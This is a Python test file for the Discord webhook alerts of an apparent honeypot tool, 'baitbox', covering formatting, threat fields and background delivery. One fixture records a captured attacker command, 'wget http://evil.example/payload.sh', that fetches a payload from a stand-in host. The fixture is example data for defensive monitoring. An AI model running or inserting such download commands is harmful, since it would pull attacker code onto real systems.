"""Tests for webhook notification formatting and delivery."""

from __future__ import annotations

import json
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

from baitbox.webhooks import _send_webhook_sync, send_webhook_notification


def _webhook_settings(**kwargs):
    defaults = {"webhook_url": "", "webhook_type": "discord"}
    defaults.update(kwargs)
    return SimpleNamespace(**defaults)


def test_send_webhook_skips_when_url_unset(monkeypatch):
    monkeypatch.setattr("baitbox.webhooks.settings", _webhook_settings())
    with patch("baitbox.webhooks.threading.Thread") as thread_cls:
        send_webhook_notification({"src_ip": "1.2.3.4"})
        thread_cls.assert_not_called()


def test_discord_webhook_includes_threat_fields(monkeypatch):
    captured: dict = {}

    class FakeResponse:
        def read(self):
            return b"ok"

    def fake_urlopen(req, timeout=5):
        captured["url"] = req.full_url
        captured["body"] = json.loads(req.data.decode())
        return FakeResponse()

    monkeypatch.setattr(
        "baitbox.webhooks.settings",
        _webhook_settings(webhook_url="https://discord.example/hook", webhook_type="discord"),
    )
    monkeypatch.setattr("baitbox.webhooks.urllib.request.urlopen", fake_urlopen)

    event = {
        "src_ip": "203.0.113.10",
        "protocol": "SSH",
        "event_type": "command",
        "threat_level": "CRITICAL",
        "threat_score": 85,
        "threat_reasons": ["High-risk commands"],
        "payload": {"command": "wget http://evil.example/payload.sh"},
    }
    _send_webhook_sync(event)

    embed = captured["body"]["embeds"][0]
    assert embed["color"] == 15548997
    assert any(f["name"] == "Threat Level" for f in embed["fields"])
    assert "wget" in embed["description"]


def test_discord_webhook_telnet_auth_format(monkeypatch):
    captured: dict = {}

    class FakeResponse:
        def read(self):
            return b"ok"

    def fake_urlopen(req, timeout=5):
        captured["body"] = json.loads(req.data.decode())
        return FakeResponse()

    monkeypatch.setattr(
        "baitbox.webhooks.settings",
        _webhook_settings(webhook_url="https://discord.example/hook", webhook_type="discord"),
    )
    monkeypatch.setattr("baitbox.webhooks.urllib.request.urlopen", fake_urlopen)

    _send_webhook_sync({
        "src_ip": "198.51.100.20",
        "protocol": "Telnet",
        "event_type": "auth_attempt",
        "payload": {"username": "admin", "password": "123456", "method": "telnet"},
    })

    assert "Telnet Login Attempt" in captured["body"]["embeds"][0]["description"]


def test_send_webhook_runs_in_background_thread(monkeypatch):
    monkeypatch.setattr(
        "baitbox.webhooks.settings",
        _webhook_settings(webhook_url="https://discord.example/hook"),
    )
    thread = MagicMock()
    with patch("baitbox.webhooks.threading.Thread", return_value=thread) as thread_cls:
        send_webhook_notification({"src_ip": "1.2.3.4", "protocol": "HTTP", "event_type": "request", "payload": {}})
        thread_cls.assert_called_once()
        thread.start.assert_called_once()
